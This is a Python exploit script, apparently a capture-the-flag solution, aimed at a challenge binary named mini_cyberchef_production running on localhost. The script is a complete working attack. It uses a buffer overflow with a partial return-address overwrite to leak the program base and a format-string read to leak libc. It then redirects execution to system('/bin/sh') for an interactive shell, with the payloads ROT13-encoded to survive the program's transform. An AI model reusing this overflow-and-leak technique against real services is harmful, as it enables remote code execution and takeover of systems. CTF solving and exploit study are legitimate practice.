from ptrlib import *
import codecs

elf = ELF('../dist/mini_cyberchef_production')
libc = ELF('../dist/libc.so.6')


def rot13_payload(payload):
    new_payload = b""
    for i in range(0, len(payload)):
        if (payload[i:i+1].isalpha()):
            new_payload += codecs.encode(payload[i:i+1].decode(), 'rot-13').encode()
        else:
            new_payload += payload[i:i+1]
    return new_payload

def rot13(payload, enc=True):
    if (enc):
        payload = codecs.encode(payload.decode(), 'rot-13')
    io.sendlineafter("> ", '3')
    io.sendlineafter("> ", payload)
    io.recvuntil(": ")
    first = io.recvuntil("\nRestore\n")[0xf8:-10]
    return first

while(1):
    try:
        #io = Process('../dist/mini_cyberchef_production')
        io = remote('localhost', 30008)
        #input("> ")
        write_addr = elf.symbol('main') + 0x13c
        payload1 = b"A" * (0x100-8) + p16(write_addr)
        first = rot13(payload1)
        text_base = u64(first) - 0x13c - elf.symbol('main')
        print("text_base = " + hex(text_base))
        printf_addr = text_base + 0x1f6c
        print(hex(printf_addr))
        format_str = b"%11$p, END"
        payload2 = rot13_payload(format_str + b"A" * (0x100-8-len(format_str)) + p64(printf_addr))
        io.send(payload2)
        #io.recvuntil("ROT13 Shift")
        io.recvuntil("ROT13 Shift", timeout=0.1)
        break
    except TimeoutError as e:
        io.close()
        print(e)

#input("> ")
io.sendline('3')
io.recvuntil("END")
libc_base = int(io.recvuntil("END")[-19:-5].decode(), 16) - 0x29d90
print("libc_base = " + hex(libc_base))
#io.sendlineafter("> ", rot13_payload(payload1))

system_addr = libc_base + libc.symbol('system')
bin_sh_str = b"/bin/sh\x00"
payload4 = rot13_payload(bin_sh_str + b"A" * (0x100-8-len(bin_sh_str)) + p64(system_addr))
io.sendafter("> ", payload4)

io.interactive()
